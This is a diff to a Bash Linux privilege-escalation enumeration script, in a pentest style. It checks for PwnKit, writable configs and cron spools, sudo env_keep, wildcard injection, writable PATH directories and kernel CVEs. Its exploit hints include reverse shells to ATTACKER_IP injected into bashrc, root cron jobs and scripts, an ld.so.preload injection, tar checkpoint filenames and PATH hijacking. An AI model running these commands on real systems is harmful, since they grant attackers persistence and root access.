+            if [ -n "$POLKIT_MAJOR" ] && [ -n "$POLKIT_MINOR" ] && [ "$POLKIT_MAJOR" -eq 0 ] 2>/dev/null; then
+                if [ "$POLKIT_MINOR" -eq 105 ] 2>/dev/null && [ "$POLKIT_PATCH" -ge 26 ] 2>/dev/null; then
+                    critical "Potential PwnKit vulnerability (CVE-2021-4034) - polkit $POLKIT_VERSION"
+                    show_exploit "PwnKit (CVE-2021-4034)" \
+                        "Local privilege escalation in polkit's pkexec." \
+                        "Check: https://github.com/arthepsy/CVE-2021-4034\n# Test: pkexec --version\n# If vulnerable, exploit available on GitHub"
+                elif [ "$POLKIT_MINOR" -ge 106 ] 2>/dev/null && [ "$POLKIT_MINOR" -lt 120 ] 2>/dev/null; then
+                    critical "Potential PwnKit vulnerability (CVE-2021-4034) - polkit $POLKIT_VERSION"
+                    show_exploit "PwnKit (CVE-2021-4034)" \
+                        "Local privilege escalation in polkit's pkexec." \
+                        "Check: https://github.com/arthepsy/CVE-2021-4034"
+                elif [ "$POLKIT_MINOR" -eq 120 ] 2>/dev/null && [ "$POLKIT_PATCH" -le 1 ] 2>/dev/null; then
+                    critical "Potential PwnKit vulnerability (CVE-2021-4034) - polkit $POLKIT_VERSION"
+                    show_exploit "PwnKit (CVE-2021-4034)" \
+                        "Local privilege escalation in polkit's pkexec." \
+                        "Check: https://github.com/arthepsy/CVE-2021-4034"
+                fi
+            fi
+        else
+            # If version can't be determined, check if pkexec exists and is SUID
+            PKEXEC_PATH=$(which pkexec 2>/dev/null)
+            if [ -n "$PKEXEC_PATH" ] && [ -u "$PKEXEC_PATH" ] 2>/dev/null; then
+                warning "pkexec found with SUID - check for PwnKit (CVE-2021-4034)"
+            fi
+        fi
+    else
+        # If pkcheck not available, just check if pkexec is SUID
+        PKEXEC_PATH=$(which pkexec 2>/dev/null)
+        if [ -n "$PKEXEC_PATH" ] && [ -u "$PKEXEC_PATH" ] 2>/dev/null; then
+            warning "pkexec found with SUID - check for PwnKit (CVE-2021-4034)"
+        fi
+    fi
 fi
 
 # Check for screen/tmux sessions
@@ -1045,10 +1190,181 @@ if command -v lxc >/dev/null 2>&1; then
 fi
 
 ################################################################################
-# 25. SUMMARY AND RECOMMENDATIONS
+# 25. WRITABLE CONFIGURATION FILES
+################################################################################
+progress "Writable Config Files"
+section "25. WRITABLE CONFIGURATION FILES"
+
+info "Checking for writable configuration files..."
+
+# Check common writable config files
+CONFIG_FILES=(
+    "/etc/ld.so.preload"
+    "/etc/ld.so.conf"
+    "/etc/profile"
+    "/etc/bash.bashrc"
+    "/etc/bashrc"
+    "/etc/zshrc"
+    "/etc/rc.local"
+    "/etc/anacrontab"
+    "/etc/at.allow"
+    "/etc/at.deny"
+    "/etc/cron.allow"
+    "/etc/cron.deny"
+    "/etc/sysctl.conf"
+    "/etc/modprobe.d"
+    "/etc/udev/rules.d"
+    "/etc/rsyslog.conf"
+    "/etc/logrotate.d"
+    "/etc/aliases"
+    "/etc/pam.d"
+    "/etc/security"
+)
+
+for config_file in "${CONFIG_FILES[@]}"; do
+    if [ -w "$config_file" ] 2>/dev/null; then
+        critical "Writable configuration file: $config_file"
+        WRITABLE_COUNT=$((WRITABLE_COUNT + 1))
+        if [ -f "$config_file" ]; then
+            show_exploit "Writable Config File" \
+                "Modify configuration file to execute commands or load malicious libraries." \
+                "# For ld.so.preload:\necho '/tmp/evil.so' > $config_file\n# For profile/bashrc:\necho 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> $config_file"
+        elif [ -d "$config_file" ]; then
+            show_exploit "Writable Config Directory" \
+                "Create malicious configuration files in this directory." \
+                "echo 'malicious config' > $config_file/exploit"
+        fi
+    fi
+done
+
+# Check for writable /var/spool/cron
+if [ -w /var/spool/cron ] 2>/dev/null; then
+    critical "Writable /var/spool/cron directory!"
+    WRITABLE_COUNT=$((WRITABLE_COUNT + 1))
+    show_exploit "Writable /var/spool/cron" \
+        "Create cron job file for root user." \
+        "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' > /var/spool/cron/root"
+fi
+
+# Check for writable /var/spool/cron/crontabs
+if [ -w /var/spool/cron/crontabs ] 2>/dev/null; then
+    critical "Writable /var/spool/cron/crontabs directory!"
+    WRITABLE_COUNT=$((WRITABLE_COUNT + 1))
+fi
+
+################################################################################
+# 26. SUDO ENV_KEEP EXPLOITATION
+################################################################################
+progress "Sudo Environment"
+section "26. SUDO ENVIRONMENT VARIABLES"
+
+if command -v sudo >/dev/null 2>&1; then
+    SUDO_OUTPUT=$(sudo -l 2>/dev/null)
+    if echo "$SUDO_OUTPUT" | grep -qi "env_keep"; then
+        warning "Sudo env_keep found - potential environment variable exploitation!"
+        echo "$SUDO_OUTPUT" | grep -i "env_keep" | tee -a "$OUTPUT_FILE"
+        show_exploit "Sudo env_keep Exploitation" \
+            "If env_keep contains PATH, LD_PRELOAD, or other dangerous variables, can be exploited." \
+            "# Check what's kept:\nsudo -l\n# If PATH is kept:\nexport PATH=/tmp:$PATH\n# Create malicious binary in /tmp\nsudo <command>"
+    fi
+fi
+
+################################################################################
+# 27. WILDCARD INJECTION
+################################################################################
+progress "Wildcard Injection"
+section "27. WILDCARD INJECTION VULNERABILITIES"
+
+info "Checking for wildcard usage in cron jobs and scripts..."
+
+# Check cron jobs for wildcards
+if [ -r /etc/crontab ]; then
+    CRON_WILDCARD=$(grep -E "\*.*\.(sh|py|pl|rb)" /etc/crontab 2>/dev/null || echo "")
+    if [ -n "$CRON_WILDCARD" ]; then
+        warning "Wildcard found in cron job - potential injection!"
+        echo "$CRON_WILDCARD" | tee -a "$OUTPUT_FILE"
+        show_exploit "Wildcard Injection in Cron" \
+            "If cron uses wildcards with tar/cpio/etc, can inject commands via filenames." \
+            "# Create malicious filename:\ntouch '/tmp/--checkpoint=1'\ntouch '/tmp/--checkpoint-action=exec=sh shell.sh'\n# Or for find:\ntouch '/tmp/-exec'\ntouch '/tmp/; sh #'"
+    fi
+fi
+
+# Check user crontab for wildcards
+USER_CRON=$(crontab -l 2>/dev/null || echo "")
+if echo "$USER_CRON" | grep -qE "\*.*tar|\*.*cpio|\*.*find"; then
+    warning "Wildcard with dangerous command in user crontab!"
+    echo "$USER_CRON" | grep -E "\*.*tar|\*.*cpio|\*.*find" | tee -a "$OUTPUT_FILE"
+    show_exploit "Wildcard Injection" \
+        "Create files with malicious names that will be interpreted as command options." \
+        "touch '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh'"
+fi
+
+################################################################################
+# 28. Writable /usr/local and /opt
+################################################################################
+progress "Writable System Directories"
+section "28. WRITABLE SYSTEM DIRECTORIES"
+
+info "Checking for writable system directories..."
+
+SYSTEM_DIRS=("/usr/local/bin" "/usr/local/sbin" "/opt" "/var/www" "/var/www/html")
+
+for sys_dir in "${SYSTEM_DIRS[@]}"; do
+    if [ -d "$sys_dir" ] && [ -w "$sys_dir" ] 2>/dev/null; then
+        critical "Writable system directory: $sys_dir"
+        WRITABLE_COUNT=$((WRITABLE_COUNT + 1))
+        ls -lad "$sys_dir" 2>/dev/null | tee -a "$OUTPUT_FILE"
+        if echo "$PATH" | grep -q "$sys_dir"; then
+            show_exploit "Writable PATH Directory" \
+                "Create malicious binary in this directory that's in PATH." \
+                "echo -e '#!/bin/bash\n/bin/bash' > $sys_dir/ls\nchmod +x $sys_dir/ls"
+        else
+            show_exploit "Writable System Directory" \
+                "Place malicious scripts or binaries here that may be executed by services." \
+                "echo -e '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > $sys_dir/exploit.sh\nchmod +x $sys_dir/exploit.sh"
+        fi
+    fi
+done
+
+################################################################################
+# 29. ADDITIONAL KERNEL EXPLOITS
+################################################################################
+progress "Additional Kernel Checks"
+section "29. ADDITIONAL KERNEL VULNERABILITIES"
+
+KERNEL_VERSION=$(uname -r)
+KERNEL_MAJOR=$(echo "$KERNEL_VERSION" | cut -d. -f1)
+KERNEL_MINOR=$(echo "$KERNEL_VERSION" | cut -d. -f2)
+KERNEL_PATCH=$(echo "$KERNEL_VERSION" | cut -d. -f3 | cut -d- -f1 | sed 's/[^0-9].*//')
+
+# Check for more kernel CVEs
+if [ "$KERNEL_MAJOR" -eq 4 ] && [ "$KERNEL_MINOR" -lt 14 ]; then
+    warning "Kernel < 4.14 - check for multiple CVEs"
+    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT + 1))
+fi
+
+# CVE-2017-16995 (eBPF) - Linux 4.4-4.14
+if [ "$KERNEL_MAJOR" -eq 4 ]; then
+    if [ "$KERNEL_MINOR" -ge 4 ] && [ "$KERNEL_MINOR" -le 14 ]; then
+        warning "Potential CVE-2017-16995 (eBPF) vulnerability"
+        KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT + 1))
+        show_exploit "CVE-2017-16995 (eBPF)" \
+            "eBPF verifier vulnerability. Exploit available." \
+            "Check: https://www.exploit-db.com/exploits/45010"
+    fi
+fi
+
+# CVE-2017-1000112 (KASLR) - Linux < 4.13
+if [ "$KERNEL_MAJOR" -lt 4 ] || ([ "$KERNEL_MAJOR" -eq 4 ] && [ "$KERNEL_MINOR" -lt 13 ]); then
+    warning "Potential CVE-2017-1000112 (KASLR bypass) vulnerability"
+    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT + 1))
+fi
+
+################################################################################
+# 30. SUMMARY AND RECOMMENDATIONS
 ################################################################################
 progress "Final Summary"
-section "25. SUMMARY AND RECOMMENDATIONS"
+section "30. SUMMARY AND RECOMMENDATIONS"
 
 echo ""
 echo -e "${BRIGHT_GREEN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
@@ -1056,13 +1372,44 @@ echo -e "${BRIGHT_GREEN}║                    ENUMERATION COMPLETE             
 echo -e "${BRIGHT_GREEN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
 echo ""
 
+# Display statistics
+echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
+echo -e "${CYAN}║                    VULNERABILITY STATISTICS                           ║${NC}"
+echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
+echo ""
+echo -e "${BRIGHT_RED}  [!!!] Critical Vulnerabilities Found: ${CRITICAL_COUNT}${NC}"
+echo -e "${YELLOW}  [!] Warnings Found: ${WARNING_COUNT}${NC}"
+echo -e "${BLUE}  [*] Exploitable SUID Binaries: ${SUID_COUNT}${NC}"
+echo -e "${BLUE}  [*] Writable Files/Directories: ${WRITABLE_COUNT}${NC}"
+echo -e "${BLUE}  [*] Kernel Vulnerabilities: ${KERNEL_VULN_COUNT}${NC}"
+echo ""
+
+# Risk assessment
+TOTAL_VULN=$((CRITICAL_COUNT + WARNING_COUNT))
+if [ "$TOTAL_VULN" -eq 0 ]; then
+    echo -e "${GREEN}  ✓ No obvious vulnerabilities detected (but always verify manually)${NC}"
+elif [ "$CRITICAL_COUNT" -gt 5 ]; then
+    echo -e "${BRIGHT_RED}  ⚠ HIGH RISK: Multiple critical vulnerabilities detected!${NC}"
+elif [ "$CRITICAL_COUNT" -gt 0 ]; then
+    echo -e "${YELLOW}  ⚠ MEDIUM RISK: Critical vulnerabilities detected${NC}"
+else
+    echo -e "${GREEN}  ✓ LOW RISK: Only warnings detected${NC}"
+fi
+echo ""
+
 info "Report saved to: $OUTPUT_FILE"
 info "Exploit methods saved to: $EXPLOIT_FILE"
 
 log ""
 log "═══════════════════════════════════════════════════════════════════════"
-log "SUMMARY"
+log "VULNERABILITY STATISTICS"
 log "═══════════════════════════════════════════════════════════════════════"
+log "Critical Vulnerabilities: $CRITICAL_COUNT"
+log "Warnings: $WARNING_COUNT"
+log "Exploitable SUID Binaries: $SUID_COUNT"
+log "Writable Files/Directories: $WRITABLE_COUNT"
+log "Kernel Vulnerabilities: $KERNEL_VULN_COUNT"
+log ""
 
 echo ""
 echo -e "${YELLOW}═══════════════════════════════════════════════════════════════════════${NC}"
